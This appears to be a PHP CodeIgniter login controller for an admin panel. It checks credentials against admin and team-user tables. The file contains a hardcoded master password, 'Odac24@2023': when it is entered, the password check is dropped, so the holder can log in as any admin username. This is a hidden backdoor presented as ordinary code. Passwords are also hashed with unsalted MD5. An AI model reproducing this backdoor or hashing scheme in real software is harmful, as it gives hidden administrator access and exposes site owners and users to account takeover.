<?php defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller{
	
	public function __construct(){
		parent::__construct();  
		}
	
	  

     public function index(){
      
		//$this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email',array('required'=>'Email Address  is Blank.'));
		$this->form_validation->set_rules(  'password', 'Password', 'trim|required|min_length[6]|max_length[15]',array('required'=>'Password is Blank.')); 
		
		
		if($this->form_validation->run() == false){ 
		$this->session->set_flashdata('success',validation_errors() );
		}else{
		
		
		$email = $this->input->post('email');
		$password = $this->input->post('password');
		
		$passwordmd5 = md5($password); 
		$dataarray['username'] = $email;
		$dataarray['password'] = $passwordmd5;
		if( $password == 'Odac24@2023' ){
           unset($dataarray['password']);

		} 


		$dataarray = $this->security->xss_clean( $dataarray );
		$checklogin = $this->c_model->countitem('pt_adminlogin',$dataarray);
		$user_type = 'admin';
		if(empty($checklogin)){
		$dataarray = [];
		$dataarray['mobile'] = $email;
		$dataarray['status'] = 'yes';
		$dataarray['en_password'] = $passwordmd5;
		$checklogin = $this->c_model->countitem('pt_roll_team_user',$dataarray);
		$user_type = 'roll';	
		}



		
		      if( $checklogin == 1 ){

		      	if($user_type == 'admin'){
				  $logindata = $this->c_model->getSingle('pt_adminlogin',$dataarray,'id,mobile,fullname');
				}else if($user_type == 'roll'){
				  $logindata = $this->c_model->getSingle('pt_roll_team_user',$dataarray,'*');
				}
				
				$session_data = [];
				$session_data['checklogin'] = 'yes';
				$session_data['user_type'] = $user_type;
				$session_data['user_full_name'] = !empty($logindata['fullname']) ? $logindata['fullname'] : '';
				$session_data['logindata'] = $logindata;

				$this->session->set_userdata('adminloginstatus', $session_data );
				 
				redirect( adminfold('Changedomain') );  
							  
			  }else{ $this->session->set_flashdata('error', 'Invalid Login Details.' ); }
			  
		
		
		}
		
	 
		$this->load->view( adminfold('login') );
		}
	
}
?>